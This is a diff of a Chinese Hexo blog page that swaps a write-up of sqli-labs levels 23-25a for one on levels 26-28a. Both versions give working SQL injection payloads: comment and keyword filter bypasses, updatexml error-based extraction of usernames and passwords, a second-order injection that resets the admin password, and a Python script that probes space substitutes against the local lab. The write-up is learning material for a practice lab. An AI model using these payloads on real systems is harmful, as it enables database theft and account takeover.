@@ -10,7 +10,7 @@
   
   <title>
     
-      sqli-labs-Less23-25a | Hexo
+      sqli-labs-Less26-28a | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -193,7 +193,7 @@
 </header>
 
     <div id="article-banner">
-  <h2>sqli-labs-Less23-25a</h2>
+  <h2>sqli-labs-Less26-28a</h2>
   <p class="post-date">2021-10-26</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
@@ -202,64 +202,33 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>23关开始后几关，主要是学习当某些字符被过滤时如何绕过。</p>
+    <section class="markdown-content"><p>方法仍然相同，都是替换被过滤的字符，新增的内容可能就是用python写脚本，不过都比较简单，目前我掌握的也还很片面。</p>
 <span id="more"></span>
-<h4 id="Less23">Less23</h4>
-<p>又回到GET方式下的注入，用?id=1’确定存在注入后，我们用–+注释，试过多种注入方式都报错，由于之前在Bugku做过sql注入，猜测这里可能是因为某些字符被过滤了，打开源码证实了我们的猜想。</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/%E8%BF%87%E6%BB%A4.png" alt></p>
-<p>这里#和–被替换成空字符串了，也就是被过滤，意味着–+的注释方式已不可取，所以我们必须要寻找可以替换的注释方法,这里总结两种：</p>
-<h5 id="替换–-的注入方式">替换–+的注入方式</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or &#x27;1 // 总返回真，有问题</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
-<p>但是用第一种注释方法判断列数时，总返回为真，这是由MySQL的解析顺序引起的。所以我们只用第二种爆库，后面的步骤就很常规了。</p>
-<h4 id="解析or-‘1问题">解析or ‘1问题</h4>
-<p>当我们采用这种闭合（注释）方式时，发现可以回显，但总返回为真，这是由于MySQL的解析顺序引起的，在这种情况下使用order by语句时，where=…会将他看作一个整体，所以1=1让他总返回为真，那我们有什么处理方法吗？（具体可以参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/annsshadow/p/5037667.html%EF%BC%89">https://www.cnblogs.com/annsshadow/p/5037667.html）</a></p>
-<p>首先，order by查询列数得考虑用union联合查询替代，并且，要划分为两部分才能让他不总是1=1始终为真,这就采用and的性质，可以理解为逻辑与，前一个and先判断，再判断后一个and。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;and &#x27;1&#x27;=&#x27;1&#x27;union select 1,2,3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-<p>不过要注意的是，输入有别于之前，这里举例一个查库就看明白了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-<p>加()是2中的看作整体，图文说明：</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/123.png" alt></p>
-<h5 id="updatexml方法">updatexml方法</h5>
-<p>如果文档中有可以改变的节点的值，就可以使用updatexml，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
-<p>例如：select * from text where ide = 1 and (updatexml(1,0x7e,3))；由于0x7e是~，不符合xpath语法格式，因此报出xpath语法错误，从而得到我们想要的结果。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3, 1),0x7e),1);%00</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/1.png" alt></p>
-<h4 id="Less24">Less24</h4>
-<p>首先，我们需要理解学习二次注入的意思，下面是简单的摘要。</p>
-<h5 id="二次注入">二次注入</h5>
-<p><strong>二次注入可以理解为</strong>：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理数据又被还原并储存在数据库中，当web程序调用数据库中的恶意数据并执行SQL查询时，就发生了二次注入。（简单来说，就是第一次注入数据，第二次引用数据）</p>
-<p>二次注入，可以概括为以下两步：</p>
-<p><strong>第一步：插入恶意数据</strong></p>
-<p>进入数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
-<p><strong>第二步：引用恶意数据</strong></p>
-<p>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库取出恶意数据，没有进行下一步的检验处理。</p>
-<p>**例如：**输入参数id=1’ — 传输转移id=1\ ’ — 此时转义之后无法注入 — 存入数据库为1’ — 再次取出直接闭合</p>
-<h5 id="Less24-解">Less24-解</h5>
-<p>先看一下我们现在字段值的情况，admin的密码为hello，可以看到15行和16行是我们实行二次注入的替换账号，我们就是通过注册新账号来修改admin的密码。<img src="/2021/10/26/sqli-labs-Less23-25a/a.png" alt></p>
-<p>ok，我们先重置以下数据，免得太混乱，假设我们现在不知道admin的密码，我现在要实现将密码改为less24。</p>
-<p>一、注册一个账号为admin‘#，密码为less24，注册成功会显示下面的画面</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/1234-16352256213932.png" alt></p>
-<p>二、点击home回到首页，登陆刚才注册的账号</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/mima1.png" alt></p>
-<p>告诉你可以修改密码，我们修改为less24，成功。</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/zx.png" alt></p>
-<p>三、回到首页，就可以以less24登陆admin账号，登陆成功的界面是这样的，是不是就实现了在不知道真正的密码黑进了数据库？</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/p.png" alt></p>
-<p>四、上帝视角下的字段值是这样的。</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/k.png" alt></p>
-<p>jhuikai是admin’#的注册密码，我们对其修改为less24，然后修改的密码不改变原账号的密码，修改的是admin的密码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">（1）后端（PHP）代码对语句进行了转义</span><br><span class="line">（2）保存进数据库（mysql）时没有转义，是原语句</span><br></pre></td></tr></table></figure>
-<h4 id="Less25-25a">Less25&amp;25a</h4>
-<p>学习第25关之前，需要先大概了解<strong>SQL注入绕过waf的姿势</strong>，百度就有很详细的讲解。</p>
-<p>[]: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a>	“SQL注入绕过waf的一万种姿势”</p>
-<p>打开源码发现这一次被过滤的是or和and。</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/po.png" alt></p>
-<p>所以我们需要找到可以绕过or和and的方法，这里整理了三种方法。</p>
-<h5 id="绕过or和and">绕过or和and</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大小写绕过 // Or aNd</span><br><span class="line">关键字重复 // OORr</span><br><span class="line">关键字替换 // and=&amp;&amp;；or=||</span><br></pre></td></tr></table></figure>
-<p>方法不局限于这三种，还有很多，不过要特别注意的是，由于mysql对大小写并不敏感，大小写绕过不适用。</p>
-<p>所以我们只要在爆库是重复or和and就可以了，通过这里就可以知道自己输入的回显出的语句了。</p>
-<p><img src="/2021/10/26/sqli-labs-Less23-25a/7-16352255990381.png" alt></p>
+<h4 id="Less26-26a">Less26&amp;26a</h4>
+<p>打开源码查看，可以看出Less26过滤了or、and、–、#、空格、斜线，过滤的还是挺多的，–、or和and我们已经知道怎么绕过了，所以该关主要学习后两种。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&#x27;/[\s]/&#x27;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\\\\]/&#x27;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br></pre></td></tr></table></figure>
+<p>首先，我们先简单分析一下，学到这里，我们也已经知道注入的语句和流程了，–和#，分别是GET和POST的闭合关键字符，Less26是GET方式，而对于绕过–，我们也是掌握的了，说明该关主要是针对空格的绕过学习。</p>
+<h5 id="updataxml方法">updataxml方法</h5>
+<p>我们采用||来绕过代码，举例个查库和查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;|| updatexml(1,concat(0x7e,(database())),1) || &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27;|| updatexml(1,concat(0x7e,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=&#x27;security&#x27;))),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>但是这种方法在查字段的值有限制，只有前几个，不过我们可以通过改变id的值遍历所有数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;|| updatexml(1,concat(0x7e,(select (group_concat(concat_ws(0x7e,username,password))) from (security.users) where (id=x))),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>不过可以发现这种方法下括号特别多，比较复杂，下面我们可以尝试采用将空格替换为编码字符的方法。</p>
+<h5 id="URL编码">URL编码</h5>
+<p>[]: <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">https://www.w3school.com.cn/tags/html_ref_urlencode.asp</a>	“ASCII 编码参考手册”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格 = %a0；</span><br></pre></td></tr></table></figure>
+<p>那除此之外，还有什么编码字符是可以替代空格的呢？我们用python写个脚本找出来。</p>
+<h5 id="脚本-空格">脚本-空格</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(0, 256):</span><br><span class="line">    # print(i)</span><br><span class="line">    code = hex(i).replace(&#x27;0x&#x27;, &#x27;&#x27;)</span><br><span class="line">    if len(code) &lt; 2:</span><br><span class="line">        Code = &quot;0&quot; + code</span><br><span class="line">    code_0x = &quot;%&quot; + code</span><br><span class="line">    # print(Code_0x)</span><br><span class="line">    url = &quot;http://localhost/sqli-labs-master/Less-26/?id=1&#x27;&quot; + code_0x +&quot;%26%26&quot; + code_0x + &quot;&#x27;1&#x27;=&#x27;1&quot;</span><br><span class="line">    r = requests.get(url=url)</span><br><span class="line">    if &quot;Dumb&quot; in r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;):</span><br><span class="line">        print(code_0x)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/26/sqli-labs-Less26-28a/1265.png" alt></p>
+<p>从中我们可以找出替代空格的编码，我们知道是%a0，恰好是最后一个，不过这种方法适用于不知道的情况下。</p>
+<p>Less26a与Less26的区别就是Less26a不会报错，因为源码中报错语句被注释掉了，其他就正常注入就好了。</p>
+<h4 id="Less27-27a">Less27&amp;27a</h4>
+<p>我们查看源码看过滤的字符有哪些，对于select和union我们可以使用大小写绕过，然后就可以用联合注入了，同时因为可以报错回显，所以updatexml方法也是可以的。</p>
+<p><img src="/2021/10/26/sqli-labs-Less26-28a/%E6%BA%90%E7%A0%81.png" alt></p>
+<p>Less27a也是注释掉报错回显，所有只能采用联合注入的方法，然后可以万能语句和时间盲注等方法判断注入方式。</p>
+<h4 id="Less28-28a">Less28&amp;28a</h4>
+<p>方法仍然相同，注入方式为‘），并且可以看过滤哪些，过滤的又有哪些被注释掉，以此作为需不需要替换的依据。</p>
 </section>
     <!-- Tags START -->
     
@@ -269,20 +238,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/10/22/Bugku-web%E7%BB%83%E4%B9%A0-3/">
+      <a class="nav-left" href="/2021/10/26/sqli-labs-Less23-25a/">
         <span class="nav-arrow">← </span>
         
-          Bugku-web练习-3
+          sqli-labs-Less23-25a
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/10/26/sqli-labs-Less26-28a/">
-        
-          sqli-labs-Less26-28a
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -334,7 +296,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less23"><span class="toc-nav-text">Less23</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9B%BF%E6%8D%A2%E2%80%93-%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-nav-text">替换–+的注入方式</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%A7%A3%E6%9E%90or-%E2%80%981%E9%97%AE%E9%A2%98"><span class="toc-nav-text">解析or ‘1问题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#updatexml%E6%96%B9%E6%B3%95"><span class="toc-nav-text">updatexml方法</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less24"><span class="toc-nav-text">Less24</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-nav-text">二次注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#Less24-%E8%A7%A3"><span class="toc-nav-text">Less24-解</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less25-25a"><span class="toc-nav-text">Less25&amp;25a</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%BB%95%E8%BF%87or%E5%92%8Cand"><span class="toc-nav-text">绕过or和and</span></a></li></ol></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less26-26a"><span class="toc-nav-text">Less26&amp;26a</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#updataxml%E6%96%B9%E6%B3%95"><span class="toc-nav-text">updataxml方法</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-nav-text">URL编码</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E8%84%9A%E6%9C%AC-%E7%A9%BA%E6%A0%BC"><span class="toc-nav-text">脚本-空格</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less27-27a"><span class="toc-nav-text">Less27&amp;27a</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less28-28a"><span class="toc-nav-text">Less28&amp;28a</span></a></li></ol>
     
   </div>
 </aside>
@@ -344,7 +306,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/10/26/sqli-labs-Less23-25a/';
+    var url = 'http://example.com/2021/10/26/sqli-labs-Less26-28a/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
